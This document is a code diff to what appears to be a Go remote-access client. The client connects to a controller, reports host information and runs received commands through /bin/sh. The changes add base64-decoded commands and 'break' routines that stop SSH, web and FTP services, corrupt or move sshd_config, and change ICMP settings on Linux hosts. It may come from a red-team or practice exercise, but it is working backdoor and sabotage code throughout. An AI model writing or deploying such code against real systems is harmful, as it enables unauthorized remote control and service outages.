@@ -10,7 +10,7 @@ import (
 	"strings"
 )
 
-var HOST_IP string = GetOutboundIP() //"192.168.3.6"
+var HOST_IP string = GetIP() //"192.168.3.6"
 
 func main() {
 	connectPort := GetPort()
@@ -50,7 +50,7 @@ func GetPort() string {
 			"osFlavor:" + osFlavor + "," +
 			"hostname:" + hostname,
 	)
-	it, err := getPort.Write([]byte("INFO:{" + sendStr + "}\n"))
+	it, err := getPort.Write([]byte("ENCODED-INFO:{" + sendStr + "}\n"))
 	if err != nil {
 		fmt.Println(err.Error())
 		fmt.Println(it)
@@ -69,6 +69,7 @@ func EstablishConnection(port string) {
 			return
 		}
 		command = trim(command)
+		command = b64_decode(command)
 		args := strings.Split(command, " ")
 		if args[0] == "cd" {
 			os.Chdir(trim(command[3:]))
@@ -79,14 +80,68 @@ func EstablishConnection(port string) {
 			breakList := strings.Split(breaks, ",")
 			for _, brk := range breakList {
 				if runtime.GOOS == "linux" {
-					switch brk {
-					case "ssh.service":
-						Execute(FormatCommand("systemctl stop sshd"))
+					brks := strings.Split(brk, ".")
+					if len(brks) == 1 {
+						brks = append(brks, "")
+					}
+					switch brks[0] {
+					case "ssh":
+						switch brks[1] {
+						case "alter-config":
+							ExecuteList([]string{
+								"echo asdf >> /etc/ssh/sshd_config",
+								"systemctl restart sshd",
+							})
+						case "move-config":
+							Execute(FormatCommand("mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old"))
+						case "break-service":
+						default:
+							if CheckService("sshd") {
+								Execute(FormatCommand("systemctl stop sshd"))
+							} else if CheckService("ssh") {
+								Execute(FormatCommand("systemctl stop ssh"))
+							} else {
+								respond("Error: ssh service not found", conn)
+							}
+						}
+					case "http":
+						switch brks[1] {
+						default:
+							if CheckService("apache2") {
+								Execute(FormatCommand("systemctl stop apache2"))
+							}
+							if CheckService("httpd") {
+								Execute(FormatCommand("systemctl stop httpd"))
+							}
+							if CheckService("nginx") {
+								Execute(FormatCommand("systemctl stop nginx"))
+							}
+						}
+					case "ftp":
+						switch brks[1] {
+						default:
+							if CheckService("vsftpd") {
+								Execute(FormatCommand("systemctl stop vsftpd"))
+							}
+						}
+
 					case "icmp":
 						Execute(FormatCommand("echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all"))
 					default:
 						respond("Error: Break not supported by client", conn)
 					}
+				}
+			}
+		} else if strings.Contains(args[0], "CMD:{") {
+			breaks := args[0]
+			breaks = breaks[strings.Index(breaks, "CMD:{")+5 : strings.Index(breaks, "}")]
+			breakList := strings.Split(breaks, ",")
+			// TODO: continue here
+			respond("Commands not yet implemented", conn)
+			for _, brk := range breakList {
+				switch brk {
+				case "arp":
+
 				}
 			}
 		} else {
@@ -106,13 +161,31 @@ func EstablishConnection(port string) {
 	}
 }
 
+func CheckService(service string) bool {
+	cmd := Execute(FormatCommand("systemctl status " + service))
+	if strings.Contains(cmd, "could not be found") {
+		return false
+	}
+	return true
+}
+
 func FormatCommand(command string) string {
 	return strings.Replace(command, "\"", "\\\"", -1)
 }
 
+func ExecuteList(command []string) []string {
+	var retComp []string
+	for _, c := range command {
+		cmd := exec.Command("/bin/sh", "-c", c)
+		out, _ := cmd.CombinedOutput()
+		cmd.Run()
+		retComp = append(retComp, string(out))
+	}
+	return retComp
+
+}
+
 func Execute(command string) string {
-	// command = FormatCommand(command)
-	// command = strings.Split(command, " ")[0]
 	cmd := exec.Command("/bin/sh", "-c", command)
 	out, _ := cmd.CombinedOutput()
 	cmd.Run()
